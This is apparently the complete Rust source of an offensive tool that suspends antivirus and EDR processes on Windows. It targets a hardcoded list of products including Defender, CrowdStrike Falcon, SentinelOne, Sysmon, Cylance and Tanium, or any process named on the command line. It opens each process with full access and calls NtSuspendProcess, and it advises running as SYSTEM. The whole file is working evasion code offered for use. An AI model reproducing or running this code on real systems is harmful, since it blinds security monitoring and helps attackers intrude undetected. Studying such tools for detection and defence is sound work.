use colored::Colorize;
use ntapi::ntpsapi::NtSuspendProcess;
use std::env;
use std::mem::transmute;
use sysinfo::PidExt;
use sysinfo::ProcessExt;
use sysinfo::SystemExt;
use windows::Win32::{
    Foundation::HANDLE,
    System::Threading::{OpenProcess, PROCESS_ALL_ACCESS},
};

fn evil(target: &str) {
    let system = sysinfo::System::new_all();

    for p in system.processes_by_exact_name(target) {
        println!("Targeting process: {} with PID: {}", p.name(), p.pid());
        let pid: u32 = p.pid().as_u32();
        unsafe {
            let res_handle = OpenProcess(
                PROCESS_ALL_ACCESS,
                windows::Win32::Foundation::BOOL::from(false),
                pid,
            );

            let handle: HANDLE = match res_handle {
                Ok(h) => h,
                Err(e) => {
                    let message = format!(
                        "[-] Error accessing process: {} with PID: {}. Error: {}. Skipping..",
                        p.name(),
                        p.pid(),
                        e
                    )
                    .red();
                    println!("{}", message);
                    continue;
                }
            };

            let c_handle = transmute(handle);

            let ntstatus = NtSuspendProcess(c_handle);

            match ntstatus {
                0 => {
                    let message = format!("[+] Ronflex worked! Have a good night {}", &pid).green();
                    println!("{}", message);
                }
                _ => {
                    let message = format!("[-] Ronflex failed.. NTSTATUS: {}", ntstatus).red();
                    println!("{}", message);
                }
            }
        }
    }
}

fn main() {
    // product list source https://github.com/BishopFox/sliver/blob/041ae65c61629e65646623e472d658472022d84e/client/command/processes/ps.go
    let product_list: Vec<&str> = vec![
        "ccSvcHst.exe",
        "cb.exe",
        "RepMgr.exe",
        "RepUtils.exe",
        "RepUx.exe",
        "RepWSC.exe",
        "scanhost.exe",
        "MsMpEng.exe",
        "SenseIR.exe",
        "SenseCncProxy.exe",
        "MsSense.exe",
        "MpCmdRun.exe",
        "MonitoringHost.exe",
        "HealthService.exe",
        "smartscreen.exe",
        "CSFalconService.exe",
        "CSFalconContainer.exe",
        "bdservicehost.exe",
        "bdagent.exe",
        "bdredline.exe",
        "coreServiceShell.exe",
        "ds_monitor.exe",
        "Notifier.exe",
        "dsa.exe",
        "ds_nuagent.exe",
        "coreFrameworkHost.exe",
        "SentinelServiceHost.exe",
        "SentinelStaticEngine.exe",
        "SentinelStaticEngineScanner.exe",
        "SentinelAgent.exe",
        "SentinelAgentWorker.exe",
        "SentinelHelperService.exe",
        "SentinelBrowserNativeHost.exe",
        "SentinelUI.exe",
        "Sysmon.exe",
        "Sysmon64.exe",
        "CylanceSvc.exe",
        "CylanceUI.exe",
        "TaniumClient.exe",
        "TaniumCX.exe",
        "TaniumDetectEngine.exe",
    ];

    let args: Vec<String> = env::args().collect();

    println!("Run this tool as SYSTEM for maximum effect");

    if args.len() == 2 {
        println!(
            "[+] Executing tool in custom target mode. Targeting {} process",
            &args[1]
        );
        let target = &args[1];
        evil(target);
    } else {
        println!("[+] Starting. Attempting to clean your system from nasty AV/EDR solutions..");
        for target in product_list {
            evil(target);
        }
    }
}
